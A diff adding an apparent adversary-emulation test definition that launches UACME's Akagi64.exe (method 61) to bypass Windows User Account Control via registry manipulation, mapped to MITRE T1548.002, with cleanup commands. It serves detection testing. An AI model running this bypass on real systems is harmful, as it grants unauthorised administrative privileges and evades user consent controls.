@@ -1,0 +1,47 @@
+api_version: "2.0"
+name: UACME Bypass Method 61
+description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+
+    Author: Enigma0x3/bytecode77 derivative by Nassim Asrir
+
+    Type:	Shell API
+
+    Method: Registry key manipulation
+
+    Target:	\system32\slui.exe, \system32\changepk.exe
+
+    Component:	Attacker defined
+
+    Implementation:	ucmShellRegModMethod
+
+    UCM Method:	UacMethodDebugObject
+
+    https://github.com/hfiref0x/UACME
+args:
+    - name: uacme_exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\uacme\61 Akagi64.exe
+uuid: 7825b576-744c-4555-856d-caf3460dc236
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1548: Abuse Elevation Control Mechanism'
+    subtechniques:
+        - 'T1548.002: Bypass User Account Control'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: uacme-bypass-method-61
+      inline: |
+        "{{.Args.uacme_exe}}"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+            powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        executor: command_prompt
